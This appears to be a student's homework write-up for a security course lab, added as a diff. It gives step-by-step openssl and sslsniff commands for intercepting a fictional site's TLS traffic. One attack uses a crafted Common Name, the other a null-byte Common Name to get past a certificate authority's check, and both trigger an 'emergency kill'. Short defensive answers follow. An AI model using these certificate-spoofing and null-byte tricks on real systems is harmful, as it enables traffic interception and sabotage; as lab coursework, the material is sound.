@@ -1,0 +1,43 @@
+a)
+1st attack:
+	1: run "openssl genrsa -out data0.priv 2048" to create private key "data0.priv"
+
+	2: run "openssl req -new -key data0.priv -out data0.req" 
+	and enter "data.gov-of-caltopia.info/.neocal.info" for Common Name (CN)
+	to create request certificate file "data0.req"
+
+	3: go to budget-certs-r-us.biz and , enter login and secrete (inside "IDENTIFICATION_SECRET" file), and request is content of data0.req
+	to sign the certificate and store it into "data0.x509"
+
+	4: run "./sslsniff_install_cert data0.x509 data0.priv"
+	we can install the certificate and private key pair to creates the actual connection to the server
+
+	4:  run "./sslsniff", and check the log file, we see http_request has emergency kill is false.
+	Therefore, we add "http_request["false"] = "true" and "http_request["181"] = "180" to manipulate function in rewriter.rb
+
+	5: run "./sslsniff" again and go to site "neocal.info" to check for the status, and the "interesting is True"
+	Also check for the log file, we got <html>Kill command received. Emergency kill initiated! Disabling system...</html> 
+
+2nd attack: we use "rewrite_cn", here are the step:
+
+	1: run "openssl req -new -keyout data1_en.priv -out data1_cert.req" to create encrypt private key "data1_en.priv", and create certificate "data1_cert.req"
+	and enter "data.gov-of-caltopia.info\x00.neocal.info" for the Common Name (CN)
+
+	2: run "openssl rsa -in data1_en.priv -out data1.priv" to decrypt the private key 
+	
+	3: we create a file input.dat with a NULL character between "data.gov-of-caltopia.info" and ".neocal.info"
+	run "printf "data.gov-of-caltopia.info\x00.neocal.info" > input.dat" on the shell command
+	
+	4: run "./rewrite_cn data1_cert.req data1.priv input.dat data1.req" to rewrite CN and create request certificate file "data1.req"
+	
+	5: go to budget-certs-r-us.biz and , enter login and secrete (inside "IDENTIFICATION_SECRET" file), and request is content of data1.req
+	to sign the certificate and store it into "data1.x509"
+
+	6: run "./sslsniff_install_cert data1.x509 data1.priv" and go to site "neocal.info" to check for the status, and the "interesting is True"
+	Also check for the log file, we got <html>Kill command received. Emergency kill initiated! Disabling system...</html> 
+
+b) Set up a confirmation of another user-identifying authentication for everything being communicated to be sure(this could be a hassle for the user side).
+
+c) Use another software on top of his current buggy software. The more type of defenses the better. However, the cost of defense may not be worth it if his secret is not going to cost as much as the cost of defense.
+
+d) They should use whitelisting as opposed to blacklisting '/' and '\0' characters.
